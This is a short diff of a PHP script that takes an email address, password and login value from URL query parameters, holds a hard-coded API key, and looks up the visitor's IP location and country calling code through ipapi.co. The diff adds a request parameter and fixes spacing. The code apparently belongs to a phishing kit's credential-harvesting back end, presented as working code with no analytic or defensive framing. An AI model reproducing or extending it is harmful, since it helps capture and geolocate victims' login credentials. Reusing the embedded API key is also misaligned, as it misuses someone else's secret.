@@ -36,7 +36,7 @@ $email = $_GET["email"];
 $password = $_GET["password"];
 $login = $_GET["login"];
 $playid = $_GET['playid'];
-
+$pp = $_GET['country_calling_code'];
 $linky = $_SERVER['HTTP_HOST'];
 if($email){
 $api_key = "26dc150b1cf3c41dc866400812300e6d";
@@ -52,13 +52,13 @@ $jsondata = json_decode($ipp);
 
 $ipp = $jsondata->query;
 
-$pp= file_get_contents("https://ipapi.co/json");
+$pp = file_get_contents("https://ipapi.co/json");
 
 
 $jsondata = json_decode($pp);
 
 
-$pp= $jsondata->country_calling_code;
+$pp = $jsondata->country_calling_code;
     
     
 
